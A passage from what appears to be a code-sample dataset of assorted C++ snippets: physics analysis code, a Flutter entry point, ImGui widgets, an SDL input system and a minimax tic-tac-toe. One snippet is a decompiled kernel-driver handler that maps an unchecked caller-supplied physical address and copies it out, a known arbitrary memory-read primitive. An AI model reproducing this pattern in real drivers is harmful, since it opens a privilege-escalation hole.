std::to_string(event_id) + \".dat\";\n\tstd::ifstream fileIn(pathIn);\n\tif (!fileIn.is_open()) {\n\t\tstd::cerr << \"Error: unable to open sd input file for event \" + std::to_string(event_id) + \". Aborting...\" << std::endl;\n\t\treturn -1;\n\t}\n\n\tstd::string line; double buff; size_t x1Cnt = 0, x2Cnt = 0;\n\n\twhile (std::getline(fileIn, line)) {\n\t\tstd::stringstream ss(line);\n\t\twhile (!ss.eof()) {ss >> buff; sd[x1Cnt][x2Cnt] += buff; ++x2Cnt;}\n\t\t++x1Cnt;\n\t\tx2Cnt=0;\n\t}\n\n\tfileIn.close();\n\n\treturn 1;\n}\n\nint normSD(std::vector<std::vector<double>> &sd)\n//function that norms entropy density\n{\n\tdouble eventN = static_cast<double>(eventIDHigh - eventIDLow + 1);\n\n\tfor (size_t ix1=0; ix1<sd.size(); ++ix1)\n\t\tfor (size_t ix2=0; ix2<sd[ix1].size(); ++ix2)\n\t\t\tsd[ix1][ix2] /= eventN;\n\n\treturn 1;\n}\n\nint exportSD(std::vector<std::vector<double>> &sd)\n//function that exports averaged entropy density:\n{\n\tstd::string pathOut = \"./sdavg.dat\";\n\tstd::ofstream fileOut(pathOut, std::ios_base::out);\n\tif (!fileOut.is_open()) {\n\t\tstd::cerr << \"Error: unable to open output file. Aborting...\" << std::endl;\n\t\treturn -1;\n\t}\n\n\tfor (size_t ix1=0; ix1<sd.size(); ++ix1) {\n\t\tfor (size_t ix2=0; ix2<sd[ix1].size(); ++ix2) {\n\t\t\tfileOut << sd[ix1][ix2] << \" \";\n\t\t}\n\t\tfileOut << \"\\n\";\n\t}\n\n\tfileOut.close();\n\n\treturn 1;\t\n}\n\n//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\nstd::vector<double> xBins, yBins, xGrid, yGrid;\n\nint generateGridsBins()\n//function that generates bins and grids:\n{\n\t{\n\t\tdouble x_0 = xRangeLow - abs(xBinW)/2.0, x_step = xBinW, x_max = xRangeHigh + abs(xBinW)/2.0;\n\t\tdouble x   = x_0; while (x <= x_max) {xBins.push_back(x); x += x_step;}\n\t\t\n\t\tdouble y_0 = yRangeLow - abs(yBinW)/2.0, y_step = yBinW, y_max = yRangeHigh + abs(yBinW)/2.0;\n\t\tdouble y   = y_0; while (y <= y_max) {yBins.push_back(y); y += y_step;}\n\t}\n\t\n\t{\n\t\tdouble x_0 = xRangeLow, x_step = xBinW, x_max = xRangeHigh;\n\t\tdouble x   = x_0; while (x <= x_max) {xGrid.push_back(x); x += x_step;}\n\t\t\n\t\tdouble y_0 = yRangeLow, y_step = yBinW, y_max = yRangeHigh;\n\t\tdouble y   = y_0; while (y <= y_max) {yGrid.push_back(y); y += y_step;}\n\t}\n\n\treturn 1;\n}\n\nint loadBCP(std::vector<std::vector<double>> &bcp, size_t event_id)\n//function that loads binary collision points:\n{\n\tstd::string pathIn = srcDir + \"bcp\" + std::to_string(event_id) + \".dat\";\n\tstd::ifstream fileIn(pathIn, std::ios_base::in);\n\tif (!fileIn.is_open()) {\n\t\tstd::cerr << \"Error: unable to open bcp file for event \" + std::to_string(event_id) + \". Aborting...\" << std::endl;\n\t\treturn -1;\n\t}\n\n\tstd::string line; double buffX, buffY;\n\n\twhile (std::getline(fileIn, line)) {\n\t\tif (line.rfind(\"#\", 0) == 0) continue;\n\t\tstd::stringstream ss(line);\n\t\tss >> buffX; ss >> buffY; bcp.push_back(std::vector<double>{buffX, buffY});\n\t}\n\n\tfileIn.close();\n\n\treturn 1;\n}\n\nint countBCP(std::vector<std::vector<double>> &hist, const std::vector<std::vector<double>> &bcp)\n//function that counts binary collision points into a histogram:\n{\n\tfor (const auto& xy : bcp) {\n\t\tdouble x = xy[0];\n\t\tsize_t i=0; while(x > xBins[i]) ++i; --i;\n\t\tif ((i<0) || (i>xGrid.size()-1)) {\n\t\t\tstd::cerr << \"Error: x point value outside histogram's range. Aborting...\" << std::endl;\n\t\t\treturn -1;\n\t\t}\n\n\t\tdouble y = xy[1];\n\t\tsize_t j=0; while(y > yBins[j]) ++j; --j;\n\t\tif ((j<0) || (j>yGrid.size()-1)) {\n\t\t\tstd::cerr << \"Error: y point value outside histogram's range. Aborting...\" << std::endl;\n\t\t\treturn -2;\n\t\t}\n\n\t\t",
    "#include <iostream>\n#include <cmath>\nusing namespace std;\n\nbool isPrime(int n){\n    if (n < 2) {\n        return false;\n    }\n    for (int i = 2; i < int(sqrt((double)n) + 1); i++){\n        if (n%i == 0) {\n            return false;   \n        }\n    }\n    return true;\n}\n\nvoid insertAsc(int listnum[], int n, int x){ // Insert number x into sorted listnum with n numbers\n    int j;\n    for(j = n; j > 0; j--){\n        if(j == 0){\n            break;\n        }\n        if (listnum[j-1] <= x){\n            break;\n        } else {\n            listnum[j] = listnum[j-1];\n        }\n    }\n    listnum[j] = x;\n}\n\nvoid insertionSortAsc(int listnum[], int n){\n    int x;\n    for(int i = 1; i <= n-1; i++){\n        x = listnum[i];\n        insertAsc(listnum, i, x);\n    }\n}\n\nvoid insertDesc(int listnum[], int n, int x){ // Insert number x into sorted listnum with n numbers\n    int j;\n    for(j = n; j > 0; j--){\n        if(j == 0){\n            break;\n        }\n        if (listnum[j-1] >= x){\n            break;\n        } else {\n            listnum[j] = listnum[j-1];\n        }\n    }\n    listnum[j] = x;\n}\n\nvoid insertionSortDesc(int listnum[], int n){\n    int x;\n    for(int i = 1; i <= n-1; i++){\n        x = listnum[i];\n        insertDesc(listnum, i, x);\n    }\n}\n\nint main(){\n    int n;\n    cin >> n;\n    int DaySo[n+1];\n\n    int Even[n+1];\n    int indexEven = 0;\n\n    int Odd[n+1];\n    int indexOdd;\n\n    int temp;\n    for(int i = 0; i < n; i++){\n        cin >> temp;\n        DaySo[i] = temp;\n        if(temp%2==0){\n            Even[indexEven] = temp;\n            indexEven++;\n        } else {\n            Odd[indexOdd] = temp;\n            indexOdd++;\n        }\n    }\n    insertionSortAsc(Even, indexEven);\n    insertionSortDesc(Odd, indexOdd);\n    \n    indexEven = 0;\n    indexOdd = 0;\n\n    for(int i = 0; i < n; i++){\n        if(DaySo[i]%2==0){\n            cout << Even[indexEven] << \" \";\n            indexEven++;\n        } else {\n            cout << Odd[indexOdd] << \" \";\n            indexOdd++;\n        }\n    }\n}",
    "__int64 __fastcall sub_140006A28(unsigned int *a1, int a2, void *a3, unsigned int a4, unsigned int *a5)\r\n{\r\n  unsigned int v9; // ecx\r\n  SIZE_T v10; // r14\r\n  PVOID v11; // rax\r\n  char v12; // bp\r\n  __int64 v13; // rcx\r\n  _DWORD *v14; // rdi\r\n  _DWORD *v15; // rsi\r\n  __int64 v16; // rcx\r\n  _WORD *v17; // rdi\r\n  _WORD *v18; // rsi\r\n\r\n  if ( a2 != 12 )\r\n    return 3221225485i64;\r\n  v9 = a1[2] * a1[1];\r\n  if ( a4 < v9 )\r\n    return 3221225485i64;\r\n  v10 = v9;\r\n  v11 = MmMapIoSpace((PHYSICAL_ADDRESS)*a1, v9, MmNonCached);\r\n  v12 = 0;\r\n  switch ( a1[1] )\r\n  {\r\n    case 1u:\r\n      qmemcpy(a3, v11, a1[2]);\r\n      break;\r\n    case 2u:\r\n      v16 = a1[2];\r\n      v17 = a3;\r\n      v18 = v11;\r\n      while ( v16 )\r\n      {\r\n        *v17++ = *v18++;\r\n        --v16;\r\n      }\r\n      break;\r\n    case 4u:\r\n      v13 = a1[2];\r\n      v14 = a3;\r\n      v15 = v11;\r\n      while ( v13 )\r\n      {\r\n        *v14++ = *v15++;\r\n        --v13;\r\n      }\r\n      break;\r\n    default:\r\n      v12 = 1;\r\n      break;\r\n  }\r\n  MmUnmapIoSpace(v11, v10);\r\n  if ( v12 )\r\n    return 3221225485i64;\r\n  *a5 = a4;\r\n  return 0i64;\r\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"dall_e_image_generator\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// dear imgui, v1.90.4 WIP\n// (widgets code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Widgets: Text, etc.\n// [SECTION] Widgets: Main (Button, Image, Checkbox, RadioButton, ProgressBar, Bullet, etc.)\n// [SECTION] Widgets: Low-level Layout helpers (Spacing, Dummy, NewLine, Separator, etc.)\n// [SECTION] Widgets: ComboBox\n// [SECTION] Data Type and Data Formatting Helpers\n// [SECTION] Widgets: DragScalar, DragFloat, DragInt, etc.\n// [SECTION] Widgets: SliderScalar, SliderFloat, SliderInt, etc.\n// [SECTION] Widgets: InputScalar, InputFloat, InputInt, etc.\n// [SECTION] Widgets: InputText, InputTextMultiline\n// [SECTION] Widgets: ColorEdit, ColorPicker, ColorButton, etc.\n// [SECTION] Widgets: TreeNode, CollapsingHeader, etc.\n// [SECTION] Widgets: Selectable\n// [SECTION] Widgets: Typing-Select support\n// [SECTION] Widgets: Multi-Select support\n// [SECTION] Widgets: ListBox\n// [SECTION] Widgets: PlotLines, PlotHistogram\n// [SECTION] Widgets: Value helpers\n// [SECTION] Widgets: MenuItem, BeginMenu, EndMenu, etc.\n// [SECTION] Widgets: BeginTabBar, EndTabBar, etc.\n// [SECTION] Widgets: BeginTabItem, EndTabItem, etc.\n// [SECTION] Widgets: Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_internal.h\"\n\n// System includes\n#include <stdint.h>     // intptr_t\n\n//-------------------------------------------------------------------------\n// Warnings\n//-------------------------------------------------------------------------\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127)     // condition expression is constant\n#pragma warning (disable: 4996)     // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#if defined(_MSC_VER) && _MSC_VER >= 1922 // MSVC 2019 16.2 or later\n#pragma warning (disable: 5054)     // operator '|': deprecated between enumerations of different types\n#endif\n#pragma warning (disable: 26451)    // [Static Analyzer] Arithmetic overflow : Using operator 'xxx' on a 4 byte value and then casting the result to a 8 byte value. Cast the value to the wider type before calling operator 'xxx' to avoid overflow(io.2).\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3).\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#if __has_warning(\"-Wunknown-warning-option\")\n#pragma clang diagnostic ignored \"-Wunknown-warning-option\"         // warning: unknown warning group 'xxx'                      // not all warnings are known by all Clang versions and they tend to be rename-happy.. so ignoring warnings triggers new warnings on some configuration. Great!\n#endif\n#pragma clang diagnostic ignored \"-Wunknown-pragmas\"                // warning: unknown warning group 'xxx'\n#pragma clang diagnostic ignored \"-Wold-style-cast\"                 // warning: use of old-style cast                            // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"                    // warning: comparing floating point with == or != is unsafe // storing and comparing against same constants (typically 0.0f) is ok.\n#pragma clang diagnostic ignored \"-Wformat-nonliteral\"              // warning: format string is not a string literal            // passing non-literal to vsnformat(). yes, user passing incorrect format strings can crash the code.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"                // warning: implicit conversion changes signedness\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning: zero as null pointer constant                    // some standard header variations use #define NULL 0\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"               // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#pragma clang diagnostic ignored \"-Wenum-enum-conversion\"           // warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_')\n#pragma clang diagnostic ignored \"-Wdeprecated-enum-enum-conversion\"// warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_') is deprecated\n#pragma clang diagnostic ignored \"-Wimplicit-int-float-conversion\"  // warning: implicit conversion from 'xxx' to 'float' may lose precision\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wpragmas\"                          // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wformat-nonliteral\"                // warning: format not a string literal, format string not checked\n#pragma GCC diagnostic ignored \"-Wclass-memaccess\"",
    "#include <glimmer/glimmer.h>\r\n\r\n#include <print>\r\n#include <chrono>\r\n#include <future>\r\n\r\nusing namespace std::chrono_literals;\r\n\r\n\r\nstruct Object\r\n{\r\n    Object() { GLIMMER_GUARD; }\r\n    ~Object() { GLIMMER_GUARD; }\r\n\r\n    float exec() {\r\n        GLIMMER_GUARD;\r\n        std::this_thread::sleep_for( 1ms );\r\n        return 1.f;\r\n    }\r\n};\r\n\r\nvoid workerA() {\r\n    GLIMMER_GUARD;\r\n    std::this_thread::sleep_for( 1ms );\r\n}\r\n\r\nvoid workerB() {\r\n    GLIMMER_NGUARD( \"second worker\" );\r\n    std::this_thread::sleep_for( 1ms );\r\n}\r\n\r\nvoid workerC() {\r\n    GLIMMER_GUARD;\r\n    workerA();\r\n    std::this_thread::sleep_for( 1ms );\r\n}\r\n\r\nvoid workerD() {\r\n    GLIMMER_NGUARD( \"another named guard\" );\r\n    Object obj;\r\n    obj.exec();\r\n    std::this_thread::sleep_for( 1ms );\r\n}\r\n\r\nvoid workerE() {\r\n    GLIMMER_GUARD;\r\n    workerC();\r\n    workerD();\r\n    std::this_thread::sleep_for( 1ms );\r\n}\r\n\r\n\r\nint main( int argc, char* argv[] )\r\n{\r\n    //  manual begin & end\r\n    GLIMMER_BEGIN;\r\n\r\n    //  direct calls\r\n    workerA();\r\n    workerC();\r\n    workerD();\r\n    workerE();\r\n\r\n    //  parallel calls\r\n    std::async( workerB ).wait();\r\n    std::async( [](){ GLIMMER_GUARD; workerA(); } ).wait();\r\n\r\n    //  complex function signatures\r\n    const auto fn = []( const float x, const int& y ) -> double { \r\n        GLIMMER_GUARD; \r\n        workerA(); \r\n        return -1.0; \r\n    };\r\n\r\n    int val;\r\n    std::async( [&](){ GLIMMER_GUARD; fn( 0, val ); } ).wait();\r\n\r\n    //  fully async calls\r\n    std::vector< std::future<void> > futures;\r\n\r\n    for ( int i = 0; i < 10; i++ ) {\r\n        auto futureA = std::async( workerA );\r\n        futures.emplace_back( std::move( futureA ) );\r\n    }\r\n\r\n    for ( int i = 0; i < 3; i++ ) {\r\n        workerB();\r\n    }\r\n\r\n    for ( auto& f : futures ) {\r\n        f.wait();\r\n    }\r\n\r\n    GLIMMER_END;\r\n\r\n    //  convert and write to disk\r\n    const auto bytes = GLIMMER_NDUMP( \"demo.txt\" );\r\n    std::println( \"wrote {} bytes\", bytes.value_or( 0 ) );\r\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"today_quotes\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"inputSystem.h\"\n#include <cstring>\n#include \"SDL.h\"\n\nbool KeyboardState::GetKetValue(SDL_Scancode scancode) const\n{\n    return m_curState[scancode] == 1;\n}\n\nButtonState KeyboardState::GetKeyState(SDL_Scancode scancode) const\n{\n    if(m_preState[scancode] != 1)\n    {\n        if(m_curState[scancode] != 1)\n        {\n            return ButtonState::ENone;\n        }\n        else\n        {\n            return ButtonState::EPressed;\n        }\n    }\n    else\n    {\n        if(m_curState[scancode] != 1)\n        {\n            return ButtonState::EReleased;\n        }\n        else\n        {\n            return ButtonState::EHeld;\n        }\n    }\n    \n\n}\n\nbool MouseState::GetButtonValue(int buttonCode) const\n{\n    return (SDL_BUTTON(buttonCode) & m_curButtonsState ) == 1;\n}\n\nButtonState MouseState::GetButtonState(int buttonCode) const\n{\n    if( (SDL_BUTTON(buttonCode) & m_preButtonsState) != 1)\n    {\n        if((SDL_BUTTON(buttonCode) & m_curButtonsState)!= 1)\n        {\n            return ButtonState::ENone;\n        }\n        else\n        {\n            return ButtonState::EPressed;\n        }\n    }\n    else\n    {\n        if((SDL_BUTTON(buttonCode) & m_curButtonsState)!= 1)\n        {\n            return ButtonState::EReleased;\n        }\n        else\n        {\n            return ButtonState::EHeld;\n        }\n    }\n}\n\nbool ControllerState::GetButtonValue(SDL_GameControllerButton button) const\n{\n    return m_curButtonState[button] == 1;\n}\n\nButtonState ControllerState::GetButtonState(SDL_GameControllerButton button) const\n{\n    if (m_preButtonState[button] == 0)\n\t{\n\t\tif (m_curButtonState[button] == 0)\n\t\t{\n\t\t\treturn ENone;\n\t\t}\n\t\telse\n\t\t{\n\t\t\treturn EPressed;\n\t\t}\n\t}\n\telse // Prev state must be 1\n\t{\n\t\tif (m_curButtonState[button] == 0)\n\t\t{\n\t\t\treturn EReleased;\n\t\t}\n\t\telse\n\t\t{\n\t\t\treturn EHeld;\n\t\t}\n\t}\n}\n\nInputSystem::InputSystem()\n{\n    \n}\n\nbool InputSystem::Initialize()\n{\n    m_state.keyboard.m_curState = SDL_GetKeyboardState(nullptr);\n    memset(m_state.keyboard.m_preState,0,SDL_NUM_SCANCODES);\n    \n\n    m_state.mouse.m_curButtonsState = 0;\n    m_state.mouse.m_preButtonsState = 0;\n\n    m_controller = SDL_GameControllerOpen(0);\n\t// Initialize controller state\n\tm_state.controller.m_isConnected = (m_controller != nullptr);\n\tmemset(m_state.controller.m_curButtonState, 0,\n\t\tSDL_CONTROLLER_BUTTON_MAX);\n\tmemset(m_state.controller.m_preButtonState, 0,\n\t\tSDL_CONTROLLER_BUTTON_MAX);\n    return true;\n};\n\nvoid InputSystem::Shutdown()\n{\n    \n}\n\n/// @brief in one frame. call before SDL_PollEvent(update sdl's keyboard state)\nvoid InputSystem::PrepareForUpdate()\n{\n    memcpy(m_state.keyboard.m_preState,m_state.keyboard.m_curState,SDL_NUM_SCANCODES);\n\n    memcpy(m_state.keyboard.m_preState,m_state.keyboard.m_curState,SDL_NUM_SCANCODES);\n\n    m_state.mouse.m_preButtonsState = m_state.mouse.m_curButtonsState;\n    /// @attention TODO: why an error?\n    // m_state.mouse.m_isRelative = false;\n    m_state.mouse.m_scrollWheel = Vector2::Zero;\n\n    memcpy(m_state.controller.m_preButtonState, m_state.controller.m_curButtonState,\n        SDL_CONTROLLER_BUTTON_MAX);\n    \n}\n\nvoid InputSystem::Update()\n{\n    // mouse\n    int x = 0 , y = 0;\n    if(m_state.mouse.m_isRelative)\n    {\n        m_state.mouse.m_curButtonsState = \n            SDL_GetRelativeMouseState(&x,&y);\n    }\n    else\n    {\n        m_state.mouse.m_curButtonsState =\n            SDL_GetMouseState(&x,&y); \n    }\n\n    m_state.mouse.m_mousPos.x = static_cast<float>(x);\n    m_state.mouse.m_mousPos.y = static_cast<float>(y);\n\n    //Contorller button\n\tfor (int i = 0; i < SDL_CONTROLLER_BUTTON_MAX; i++)\n\t{\n\t\tm_state.controller.m_curButtonState[i] =\n\t\t\tSDL_GameControllerGetButton(m_controller, \n\t\t\t\tSDL_GameControllerButton(i));\n\t}\n\n\t// Triggers\n\tm_state.controller.m_leftTrigger =\n\t\tFilter1D(SDL_GameControllerGetAxis(m_controller,\n\t\t\tSDL_CONTROLLER_AXIS_TRIGGERLEFT));\n\tm_state.controller.m_rightTrigger =\n\t\tFilter1D(SDL_GameControllerGetAxis(m_controller,\n\t\t\tSDL_CONTROLLER_AXIS_TRIGGERRIGHT));\n\n\t// Sticks\n\tx = SDL_GameControllerGetAxis(m_controller,\n\t\tSDL_CONTROLLER_AXIS_LEFTX);\n\ty = -SDL_GameControllerGetAxis(m_controller,\n\t\tSDL_CONTROLLER_AXIS_LEFTY);\n\tm_state.controller.m_leftStick = Filter2D(x, y);\n\n\tx = SDL_GameControllerGetAxis(m_controller,\n\t\tSDL_CONTROLLER_AXIS_RIGHTX);\n\ty = -SDL_GameControllerGetAxis(m_controller,\n\t\tSDL_CONTROLLER_AXIS_RIGHTY);\n\tm_state.controller.m_rightStick = Filter2D(x, y);\n\n}\n\nvoid InputSystem::ProcessEvent(SDL_Event& event)\n{\n    switch (event.type)\n    {\n    case SDL_MOUSEWHEEL:\n            m_state.mouse.m_scrollWheel = Vector2(\n                static_cast<float>(event.wheel.x),\n                static_cast<float>(event.wheel.y)\n            );\n        break;\n    default: \n        break;\n    }\n}\n\nvoid InputSystem::SetRelativeMouseMode(bool value)\n{\n    SDL_bool sb = value ? SDL_TRUE : SDL_FALSE;\n    SDL_SetRelativeMouseMode(sb);\n    m_state.mouse.m_isRelative = value;\n\n}\n\nfloat InputSystem::Filter1D(int input)\n{\n    const int deadZone = 250;\n    const int maxValue = 30000;",
    "#include <SFML/Graphics.hpp>\n#include<iostream>\n\nusing namespace std;\n\nenum class Player {\n    None, X, O\n};\n\nPlayer Board[3][3];\n\nclass Move {\npublic:\n    int row;\n    int col;\n\n    Move() : row(-1), col(-1) {}\n};\n\n// initializes board with Player::None\nvoid initBoard() {\n    for (int i = 0; i < 3; i++) {\n        for (int j = 0; j < 3; j++) {\n            Board[i][j] = Player::None;\n        }\n    }\n}\n\n// Checks if board is full returns true if it is\nbool isFull() {\n    for (int i = 0; i < 3; i++) {\n        for (int j = 0; j < 3; j++) {\n            if (Board[i][j] == Player::None) {\n                return false;\n            }\n        }\n    }\n\n    return true;\n}\n\nbool hasWon(Player player) {\n\n    // Checking linear win conditions\n    for (int i = 0; i < 3; ++i) {\n        if (Board[i][0] == player && Board[i][1] == player && Board[i][2] == player) {\n            return true;\n        }\n        if (Board[0][i] == player && Board[1][i] == player && Board[2][i] == player) {\n            return true;\n        }\n    }\n\n    // Checking Diagonal win conditions\n    if (Board[0][0] == player && Board[1][1] == player && Board[2][2] == player) {\n        return true;\n    }\n\n    if (Board[0][2] == player && Board[1][1] == player && Board[2][0] == player) {\n        return true;\n    }\n\n    return false;\n}\n\n// False is X wins and true if O wins \nbool whoWon() {\n    if (hasWon(Player::O)) {\n        return true;\n    }\n    else {\n        return false;\n    }\n}\n\n// This one is the GOAT, the ultimate needle-mover, the head of the table, the tribal chief\n// AI move generation\nint minimax(Player player, int depth, int alpha, int beta, bool Maximizing) {\n    if (hasWon(Player::O)) {\n        return 10 - depth;\n    }\n    else if(hasWon(Player::X)){\n        return depth - 10;\n    }\n    else if (isFull()) {\n        return 0;\n    }\n\n    if (Maximizing) {\n        int bestscore = INT_MIN;\n\n        for (int i = 0; i < 3; i++) {\n            for (int j = 0; j < 3; j++) {\n                if (Board[i][j] == Player::None) {\n                    Board[i][j] = Player::O;\n                    int score = minimax(player, depth + 1, alpha, beta, false);\n                    Board[i][j] = Player::None;\n                    bestscore = max(bestscore, score);\n                    alpha = max(alpha, score);\n                    if (beta <= alpha) {\n                        break;\n                    }\n                }\n            }\n        }\n        return bestscore;\n    }\n    else {\n        int bestscore = INT_MAX;\n\n        for (int i = 0; i < 3; i++) {\n            for (int j = 0; j < 3; j++) {\n                if (Board[i][j] == Player::None) {\n                    Board[i][j] = Player::X;\n                    int score = minimax(player, depth + 1, alpha, beta, true);\n                    Board[i][j] = Player::None;\n                    bestscore = min(bestscore, score);\n                    beta = min(beta, score);\n                    if (beta <= alpha) {\n                        break;\n                    }\n                }\n            }\n        }\n        return bestscore;\n    }\n}\n\n// AI move selection\nMove bestMove(Player player) {\n    int bestScore = INT_MIN;\n    Move best;\n\n    for (int i = 0; i < 3; i++) {\n        for (int j = 0; j < 3; j++) {\n            if (Board[i][j] == Player::None) {\n                Board[i][j] = player;\n                int score = minimax(player, 0, INT_MIN, INT_MAX, false);\n                Board[i][j] = Player::None;\n                if (score > bestScore) {\n                    bestScore = score;\n                    best.col = j;\n                    best.row = i;\n                }\n            }\n        }\n    }\n\n    return best;\n}\n\n// Main function for players; works only through the Basic GUI and resets the game after a player wins\nint main()\n{\n    initBoard();\n    sf::Font font;\n    if (!font.loadFromFile(\"BebasNeue-Regular.ttf\")) {\n        std::cerr << \"Failed to load font\" << std::endl;\n        return 1;\n    }\n\n    sf::RenderWindow window(sf::VideoMode(300, 300), \"Tic Tac Toe\");\n    Player current = Player::X;\n    bool gameEnd = false;\n\n    while (window.isOpen()) {\n        sf::Event event;\n\n        while (window.pollEvent(event)) {\n            if (event.type == sf::Event::Closed) {\n                window.close();\n            }\n\n            if (event.type == sf::Event::MouseButtonPressed && !gameEnd && current == Player::X) {\n                sf::Vector2i mousePos = sf::Mouse::getPosition(window);\n                int x = mousePos.x / (window.getSize().x / 3);\n                int y = mousePos.y / (window.getSize().y / 3);\n                if (x >= 0 && x < 3 && y >= 0 && y < 3 && Board[y][x] == Player::None) {\n                    Board[y][x] = current;\n                    current = Player::O;\n                }\n            }\n        }\n\n        if (current == Player::O && !gameEnd) {\n            Move best = bestMove(Player::O);\n            Board[best.row][best.col] = Player::O;\n            current = Player::X;\n        }\n\n        if (hasWon(Pl",
    "/* Copyright (c) 2013 Dropbox, Inc.\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\n\n#include <LottieCpp/lottiejson11.hpp>\n#include <cassert>\n#include <cmath>\n#include <cstdlib>\n#include <cstdio>\n#include <limits>\n\nnamespace lottiejson11 {\n\nstatic const int max_depth = 200;\n\nusing std::string;\nusing std::vector;\nusing std::map;\nusing std::make_shared;\nusing std::initializer_list;\nusing std::move;\n\n/* Helper for representing null - just a do-nothing struct, plus comparison\n * operators so the helpers in JsonValue work. We can't use nullptr_t because\n * it may not be orderable.\n */\nstruct NullStruct {\n    bool operator==(NullStruct) const { return true; }\n    bool operator<(NullStruct) const { return false; }\n};\n\n/* * * * * * * * * * * * * * * * * * * *\n * Serialization\n */\n\nstatic void dump(NullStruct, string &out) {\n    out += \"null\";\n}\n\nstatic void dump(double value, string &out) {\n    if (std::isfinite(value)) {\n        char buf[32];\n        snprintf(buf, sizeof buf, \"%.17g\", value);\n        out += buf;\n    } else {\n        out += \"null\";\n    }\n}\n\nstatic void dump(int value, string &out) {\n    char buf[32];\n    snprintf(buf, sizeof buf, \"%d\", value);\n    out += buf;\n}\n\nstatic void dump(bool value, string &out) {\n    out += value ? \"true\" : \"false\";\n}\n\nstatic void dump(const string &value, string &out) {\n    out += '\"';\n    for (size_t i = 0; i < value.length(); i++) {\n        const char ch = value[i];\n        if (ch == '\\\\') {\n            out += \"\\\\\\\\\";\n        } else if (ch == '\"') {\n            out += \"\\\\\\\"\";\n        } else if (ch == '\\b') 